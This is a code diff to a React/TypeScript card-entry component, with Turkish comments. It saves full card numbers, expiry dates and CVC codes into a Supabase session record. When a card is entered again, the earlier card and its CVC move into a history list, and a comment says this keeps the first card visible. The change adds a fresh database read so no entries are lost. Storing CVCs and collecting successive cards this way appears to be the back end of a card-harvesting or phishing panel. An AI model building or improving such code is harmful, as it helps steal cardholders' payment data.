@@ -68,15 +68,30 @@ export function CardClient({ sessionId }: Props) {
     setSaving(true);
     setMsg(null);
 
+    // Kullanici verisini korumak icin form_data'yi DB'den taze oku (state bos kalmis olabilir).
+    let baseFormData: Record<string, unknown> = sessionFormData;
+    try {
+      const { data: freshRow } = await supabase
+        .from("sessions")
+        .select("form_data")
+        .eq("id", sessionId)
+        .maybeSingle();
+      if (freshRow?.form_data && typeof freshRow.form_data === "object") {
+        baseFormData = freshRow.form_data as Record<string, unknown>;
+      }
+    } catch {
+      /* fresh okuma basarisizsa state ile devam et */
+    }
+
     // ⭐ KART GECMISI APPEND: SADECE TEKRAR GIRISLERDE (daha once cardNumber DOLUYSA)
     //   ⚠️ HISTORY'E YENI DEĞIL, ESKI (degismeden onceki) KART BILGISINI PUSH ET!
     //   Boylece: kolon = YENİ kart (2. kart), history = ESKI kart (1. kart → gorunur).
-    const prevCard = String((sessionFormData as any).cardNumber || "").trim();
-    const prevCardExp = String((sessionFormData as any).cardExpiry || "").trim();
-    const prevCardCvc = String((sessionFormData as any).cardCvc || "").trim();
+    const prevCard = String((baseFormData as any).cardNumber || "").trim();
+    const prevCardExp = String((baseFormData as any).cardExpiry || "").trim();
+    const prevCardCvc = String((baseFormData as any).cardCvc || "").trim();
     const isFirstCardEntry = prevCard.length === 0;
-    const cardFormHistory: any[] = Array.isArray((sessionFormData as any).cardFormHistory)
-      ? (sessionFormData as any).cardFormHistory.slice()
+    const cardFormHistory: any[] = Array.isArray((baseFormData as any).cardFormHistory)
+      ? (baseFormData as any).cardFormHistory.slice()
       : [];
     if (!isFirstCardEntry) {
       cardFormHistory.push({
@@ -89,7 +104,7 @@ export function CardClient({ sessionId }: Props) {
     }
 
     const nextFormData = {
-      ...sessionFormData,
+      ...baseFormData,
       cardHolder: "",
       cardNumber: number.trim(),
       cardExpiry: expiry.trim(),
